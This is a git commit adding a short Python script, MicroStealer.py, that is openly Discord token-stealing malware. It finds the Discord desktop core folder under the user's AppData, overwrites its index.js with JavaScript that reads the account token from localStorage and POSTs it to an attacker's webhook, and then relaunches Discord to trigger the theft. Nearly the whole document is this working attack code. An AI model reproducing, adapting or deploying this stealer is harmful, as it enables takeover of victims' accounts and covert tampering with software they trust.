5064509cb93b4ed419bc4540f1f545e87f4b50b5
DeKrypt <52050537+dekrypted@users.noreply.github.com>
2022-02-14 20:25:58 -0500

    Add files via upload

---
+++ MicroStealer.py
@@ -0,0 +1,15 @@
+import os
+webhook = 'YOUR WEBHOOK'
+env = os.getenv('localappdata')
+for a,b,c in os.walk(env):
+    for d in b:
+        if "discord-desktop-core-" in d:
+            e = os.path.join(a, d+"\\discord_desktop_core\\index.js")
+            with open(e, 'w', encoding='utf-8') as f:
+                f.write(f'''var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '"{webhook}"', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');";''')
+                f.close()
+            try:
+                os.startfile(os.getenv('appdata')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc')
+                exit()
+            except:
+                exit()
